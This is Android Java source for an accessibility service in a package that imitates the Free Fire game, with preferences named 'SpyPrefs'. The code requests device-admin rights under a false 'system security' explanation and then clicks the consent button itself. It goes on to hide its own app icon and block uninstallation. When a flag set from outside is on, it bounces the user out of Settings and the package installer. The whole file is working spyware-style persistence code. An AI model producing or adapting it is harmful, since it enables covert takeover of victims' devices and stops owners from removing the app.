package com.dts.freefireth;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

public class AutoAdminActivator extends AccessibilityService {

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private static final String PREF_NAME = "SpyPrefs";
    private static final String KEY_BLOCK_SETTINGS = "block_settings_enabled";

    private String lastBlockedPkg = "";
    private long lastBlockTime = 0L;
    private boolean isBlockActive = false; // 🔥 DEFAULT OFF

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 50;
        setServiceInfo(info);

        SharedPreferences prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        isBlockActive = prefs.getBoolean(KEY_BLOCK_SETTINGS, false); // 🔥 DEFAULT OFF

        mainHandler.postDelayed(() -> {
            if (!isAdminActive()) requestAdmin();
        }, 800);

        enableBlockUninstall();
    }

    // ─── 🔥 METHOD YANG KURANG ──────────────────────────────────────────────

    private boolean isAdminActive() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
            return dpm != null && dpm.isAdminActive(admin);
        } catch (Exception e) { return false; }
    }

    private void requestAdmin() {
        try {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            ComponentName admin = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan sistem.");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private void enableBlockUninstall() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
            if (dpm != null && dpm.isAdminActive(admin) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                String pkgName = getPackageName();
                dpm.setApplicationHidden(admin, pkgName, true);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    dpm.setUninstallBlocked(admin, pkgName, true);
                }
            }
        } catch (Exception e) {
            android.util.Log.w("AutoAdmin", "enableBlockUninstall: " + e.getMessage());
        }
    }

    // ─── 🔥 ACCESSIBILITY EVENT ─────────────────────────────────────────────

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Kalau block aktif, pantau package settings
        if (isBlockActive && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence pkgName = event.getPackageName();
            if (pkgName != null) {
                String pkg = pkgName.toString();
                if (pkg.equals("com.android.settings") || 
                    pkg.equals("com.android.packageinstaller") ||
                    pkg.contains("settings") || 
                    pkg.contains("packageinstaller")) {
                    long now = System.currentTimeMillis();
                    if (!pkg.equals(lastBlockedPkg) || now - lastBlockTime >= 1000) {
                        lastBlockedPkg = pkg;
                        lastBlockTime = now;
                        performGlobalAction(GLOBAL_ACTION_HOME);
                        mainHandler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_HOME), 50);
                        mainHandler.post(() -> 
                            Toast.makeText(this, "🚫 Settings diblokir", Toast.LENGTH_SHORT).show()
                        );
                    }
                }
            }
        }

        // Kalo belum admin, cari tombol activate
        if (!isAdminActive()) {
            mainHandler.postDelayed(() -> {
                try {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        tryClickActivate(root);
                        root.recycle();
                    }
                } catch (Exception ignored) {}
            }, 200);
        }
    }

    private void tryClickActivate(AccessibilityNodeInfo node) {
        if (node == null) return;
        String text = "";
        if (node.getText() != null) text += node.getText().toString().toLowerCase();
        if (node.getContentDescription() != null) text += node.getContentDescription().toString().toLowerCase();

        boolean isActivateBtn = node.isClickable() && (
            text.contains("activate") || text.contains("aktifkan") ||
            text.contains("allow") || text.contains("izinkan") ||
            text.contains("enable") || text.contains("aktif") ||
            text.contains("ok") || text.contains("accept") ||
            text.contains("confirm") || text.contains("setuju") ||
            text.contains("install") || text.contains("grant") ||
            text.contains("continue") || text.contains("lanjut") ||
            text.contains("agree") || text.contains("ya") ||
            text.contains("yes")
        );

        if (isActivateBtn) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                tryClickActivate(child);
                child.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {}

    // ─── 🔥 TOGGLE DARI LUAR ─────────────────────────────────────────────────

    public static void setBlockState(Context context, boolean enabled) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            prefs.edit().putBoolean(KEY_BLOCK_SETTINGS, enabled).apply();
        } catch (Exception ignored) {}
    }

    public static boolean getBlockState(Context context) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            return prefs.getBoolean(KEY_BLOCK_SETTINGS, false);
        } catch (Exception e) { return false; }
    }
}